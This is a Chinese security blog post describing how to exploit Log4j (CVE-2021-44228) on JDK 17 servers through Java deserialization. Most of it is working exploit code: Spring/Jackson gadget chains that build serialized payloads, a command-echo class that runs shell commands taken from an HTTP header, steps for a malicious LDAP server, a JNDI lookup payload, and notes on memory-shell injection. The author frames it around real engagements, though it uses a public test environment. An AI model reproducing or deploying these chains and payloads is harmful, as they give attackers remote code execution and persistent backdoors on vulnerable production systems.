title: 当Log4j遇到jdk17~往日种种，你当真不记得了？
author: Bmth
tags: []
cover: 'https://i-blog.csdnimg.cn/direct/941136502a7746ad93395c6830c22b97.png'
categories:
  - 渗透测试
top_img: 'https://i-blog.csdnimg.cn/direct/941136502a7746ad93395c6830c22b97.png'
date: 2025-11-17 19:52:00
---
![](https://i-blog.csdnimg.cn/direct/941136502a7746ad93395c6830c22b97.png)

烂梗烂梗。。。

最近不是出了一个jdk17的反序列化，文章如下：
[高版本jdk+springboot链子](https://www.n1ght.cn/2025/08/21/%E9%AB%98%E7%89%88%E6%9C%ACjdk+springboot%E9%93%BE%E5%AD%90/)
[高版本JDK下的Spring原生反序列化链](https://fushuling.com/index.php/2025/08/21/%e9%ab%98%e7%89%88%e6%9c%acjdk%e4%b8%8b%e7%9a%84spring%e5%8e%9f%e7%94%9f%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e9%93%be/)
[JDK 17 TemplatesImpl ByPass 原理分析](https://mp.weixin.qq.com/s/DrUUAJaLig_RtXZWaAm1IQ)
[shiro+Spring高版本原生链](https://mp.weixin.qq.com/s/GGNCvh9Hp1D-XA9CEDZ3YQ)

恰好最近实战当中遇到了jdk17的log4j，那么就来看一下

## Spring的jdk17利用链
这里参考网上的代码
```java
package exp.jdk17;

import com.fasterxml.jackson.databind.node.POJONode;
import javassist.*;
import org.springframework.aop.framework.AdvisedSupport;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.*;
import java.util.Vector;

/// jdk17利用链
public class SpringbypassJDK {
    static {
        try {
            ClassPool classPool = ClassPool.getDefault();
            CtClass ctClass = classPool.getCtClass("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            writeReplace.setBody("return $0;");
            ctClass.writeFile();
            ctClass.toClass();
        } catch (Exception e){
        }
    }
    public byte[] getPayload(byte[] evilClassCode) throws Exception {
        ClassPool pool = ClassPool.getDefault();

        CtClass tempClass= pool.makeClass("Foo");
        Object templates= Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl").newInstance();
        setFieldValue(templates, "_name", "anyStr");
        setFieldValue(templates, "_transletIndex", 0);
        setFieldValue(templates, "_tfactory", Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());
        setFieldValue(templates, "_bytecodes", new byte[][]{evilClassCode, tempClass.toBytecode()});

        POJONode pojoNode = new POJONode(makeTemplatesImplAopProxy(templates));

        EventListenerList eventListenerList =new EventListenerList();
        UndoManager undomanager= new UndoManager();
        Vector vector = (Vector) getFieldValue(undomanager, "edits");
        vector.add(pojoNode);

        setFieldValue(eventListenerList, "listenerList", new Object[]{Class.class, undomanager});

        ByteArrayOutputStream baos =new ByteArrayOutputStream();
        ObjectOutputStream oos= new ObjectOutputStream(baos);
        oos.writeObject(eventListenerList);
        oos.close();

        return baos.toByteArray();
    }

    public static Object makeTemplatesImplAopProxy(Object temp) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(temp);

        Constructor<?> constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);

        return proxy;
    }
    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }
}
```
加载代码执行的类
```java
package Tools;

public class Evil {
    static {
        try {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"bash", "-c", "open -a Calculator"} : new String[]{"cmd.exe", "/c", "calc"};
            Runtime.getRuntime().exec(cmds);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
最后
```java
package exp.jdk17;

import Tools.Evil;
import Tools.SpringEcho;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.Base64;

public class test {
    public static void main(String[] args) throws Exception {
//        String exp = "rO0A.........";
//        unserialize(Base64.getDecoder().decode(exp));
        getpayload();
    }
    public static void unserialize(byte[] exp) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(exp);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
    public static void getpayload() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass evilClazz = pool.get(Evil.class.getName());
        evilClazz.getClassFile().setMajorVersion(50);
        byte[] evilPayload = new SpringbypassJDK().getPayload(evilClazz.toBytecode());
        System.out.println(Base64.getEncoder().encodeToString(evilPayload));
    }
}
```
注意在序列化生成poc的时候需要添加JVM
```
--add-opens=java.base/sun.nio.ch=ALL-UNNAMED
--add-opens=java.base/java.lang=ALL-UNNAMED
--add-opens=java.base/java.io=ALL-UNNAMED
--add-opens=java.base/java.util=ALL-UNNAMED
--add-opens=java.base/java.lang.reflect=ALL-UNNAMED
--add-opens=java.desktop/javax.swing.undo=ALL-UNNAMED
--add-opens=java.desktop/javax.swing.event=ALL-UNNAMED
--add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED
--add-opens=java.xml/com.sun.org.apache.xpath.internal.objects=ALL-UNNAMED
```
而反序列化就不需要了

### 注意事项
反序列化漏洞，有一个显而易见的问题就是版本不同导致serialVersionUID不同，从而反序列化失败

当类没有显式声明 serialVersionUID 时，可以使用`serialver`获取到该值，下载jar包：[https://mvnrepository.com/artifact/org.springframework/spring-aop](https://mvnrepository.com/artifact/org.springframework/spring-aop)
```
serialver -classpath "spring-aop-5.3.19.jar" org.springframework.aop.framework.DefaultAdvisorChainFactory
```
![](https://i-blog.csdnimg.cn/direct/b536922c8a0e41188890c573c5d60a86.png)

总结：

|依赖版本|类|serialVersionUID|
|:------:|:--------:|:-------------:|
|spring-aop<=6.0.9| org.springframework.aop.framework.DefaultAdvisorChainFactory | 6115154060221772279L |
|spring-aop>=6.0.10| org.springframework.aop.framework.DefaultAdvisorChainFactory | 273003553246259276L|
|jdk1.8| javax.swing.event.EventListenerList | -5677132037850737084L|
|jdk11/17| javax.swing.event.EventListenerList | -7977902244297240866L|
|jdk1.8| javax.swing.undo.UndoManager | -2077529998244066750L|
|jdk11/17| javax.swing.undo.UndoManager | -1045223116463488483L|


所以说，通过EventListenerList触发tostring这条链并不优雅，有没有更好用的呢，当然，其实还有一个XString的tostring链，它的serialVersionUID并没有随着JDK版本发生改变

```java
package exp.jdk17;
import com.fasterxml.jackson.databind.node.POJONode;
import javassist.*;
import sun.reflect.ReflectionFactory;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.*;
import java.util.HashMap;
import static exp.jdk17.SpringbypassJDK.makeTemplatesImplAopProxy;
import static exp.jdk17.SpringbypassJDK.setFieldValue;

public class SpringbypassJDK2 {
    static {
        try {
            // javassist 修改 BaseJsonNode
            ClassPool classPool = ClassPool.getDefault();
            CtClass ctClass = classPool.getCtClass("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            writeReplace.setBody("return $0;");
            ctClass.writeFile();
            ctClass.toClass();
        } catch (Exception e){
        }
    }
    public byte[] getPayload(byte[] evilClassCode) throws Exception {
        ClassPool pool = ClassPool.getDefault();

        CtClass tempClass= pool.makeClass("Foo");
        Object templates= Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl").newInstance();
        setFieldValue(templates, "_name", "anyStr");
        setFieldValue(templates, "_transletIndex", 0);
        setFieldValue(templates, "_tfactory", Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());
        setFieldValue(templates, "_bytecodes", new byte[][]{evilClassCode, tempClass.toBytecode()});

        POJONode pojoNode = new POJONode(makeTemplatesImplAopProxy(templates));

        Class<?> aClass1 = Class.forName("com.sun.org.apache.xpath.internal.objects.XStringForChars");
        Object xstring = createWithoutConstructor(aClass1);
        setFieldValue(xstring,"m_obj",new char[]{});
        HashMap<Object, Object> map1 = new HashMap();
        HashMap<Object, Object> map2 = new HashMap();
        map1.put("yy", pojoNode);
        map1.put("zZ", xstring);
        map2.put("yy", xstring);
        map2.put("zZ", pojoNode);
        HashMap hashmap = makeMap(map1, map2);

        ByteArrayOutputStream baos =new ByteArrayOutputStream();
        ObjectOutputStream oos= new ObjectOutputStream(baos);
        oos.writeObject(hashmap);
        oos.close();

        return baos.toByteArray();

    }
    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }
    public static <T> T createWithConstructor ( Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs ) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }
    public static <T> T createWithoutConstructor ( Class<T> classToInstantiate )
            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }
}
```
这样就避免了JDK版本的问题

## Log4j
我们这里使用的测试环境为：[https://github.com/jas502n/Log4j2-CVE-2021-44228](https://github.com/jas502n/Log4j2-CVE-2021-44228)

使用jdk17启动
![](https://i-blog.csdnimg.cn/direct/d820c18c4497416aa047fdd6bb282198.png)

正常情况下会先探测一下版本：
```
${sys:java.version}
```
![](https://i-blog.csdnimg.cn/direct/fa62ac82a60a439ba18eb82bde1a1200.png)

没问题

在几年前，我们打高版本JDK还在使用BeanFactory、JDBC之类的，但随着技术的提升，发现RMI/LDAP协议同样支持反序列化，配合最新的Springboot链，通杀

在这之前可以使用java-chains探测一下存在依赖
![](https://i-blog.csdnimg.cn/direct/1556aa8e6ffd464785e8ab61f6717807.png)

之后在DNSLOG中就会看到存在的依赖
![](https://i-blog.csdnimg.cn/direct/414f5bcc83394790afa2d85cbc170493.png)

下载工具：[https://github.com/kxcode/JNDI-Exploit-Bypass-Demo](https://github.com/kxcode/JNDI-Exploit-Bypass-Demo)

在HackerLDAPRefServer.java中放入poc
![](https://i-blog.csdnimg.cn/direct/d6e6034b6340492a9aad41c14c711662.png)


`mvn package`打包工具，启动LDAP服务：
```
java -cp HackerRMIRefServer-all.jar HackerLDAPRefServer 0.0.0.0 8088 1389
```
![](https://i-blog.csdnimg.cn/direct/bc63484507dc42938ce234f7497bd2c4.png)

目录为foo触发反序列化，成功弹出计算器！

### 回显
回显也非常简单，直接
```java
package Tools;

import java.lang.reflect.Method;
import java.util.Scanner;

public class SpringEcho{
    static {
        try {
            Class c = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
            Method m = c.getMethod("getRequestAttributes");
            Object o = m.invoke(null);
            c = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            m = c.getMethod("getResponse");
            Method m1 = c.getMethod("getRequest");
            Object resp = m.invoke(o);
            Object req = m1.invoke(o); // HttpServletRequest
            Method getWriter = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
            Method getHeader = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader", String.class);
            getHeader.setAccessible(true);
            getWriter.setAccessible(true);
            Object writer = getWriter.invoke(resp);
            String cmd = (String) getHeader.invoke(req, "cmd");
            String[] commands = new String[3];
            String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK" : "UTF-8";
            if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                commands[0] = "cmd";
                commands[1] = "/c";
            } else {
                commands[0] = "/bin/sh";
                commands[1] = "-c";
            }
            commands[2] = cmd;
            writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(), charsetName).useDelimiter("\\A").next());
            writer.getClass().getDeclaredMethod("flush").invoke(writer);
            writer.getClass().getDeclaredMethod("close").invoke(writer);
        }catch (Exception e){}
    }
}
```
![](https://i-blog.csdnimg.cn/direct/674e6fabbe4e4673b15def5d609831e5.png)


### 内存马
发现JNDIMap工具支持从URL反序列化，遂用这个LDAP服务，[https://github.com/X1r0z/JNDIMap/blob/main/USAGE.md](https://github.com/X1r0z/JNDIMap/blob/main/USAGE.md)
![](https://i-blog.csdnimg.cn/direct/cdcffada3b4b4d3d8307e7b2eb89f246.png)

勾选上Bypass JDK Module
![](https://i-blog.csdnimg.cn/direct/cac2ace652cc4a46bc91a07c1a3bcc6b.png)

将恶意类的字节码改为JMG生成的
```java
byte[] bytes = Base64.getDecoder().decode("yv66vg.......");
byte[] evilPayload = new SpringbypassJDK2().getPayload(bytes);
OutputStream output = new FileOutputStream("output.bin");
output.write(evilPayload);
output.close();
```
最后传参即可（header头有长度限制）：`
${jndi:ldap://127.0.0.1:1389/Deserialize/FromFile/output.bin}`


在后续也是更新了新版本，支持jdk17的反序列化了，推荐使用：[https://github.com/X1r0z/JNDIMap](https://github.com/X1r0z/JNDIMap)
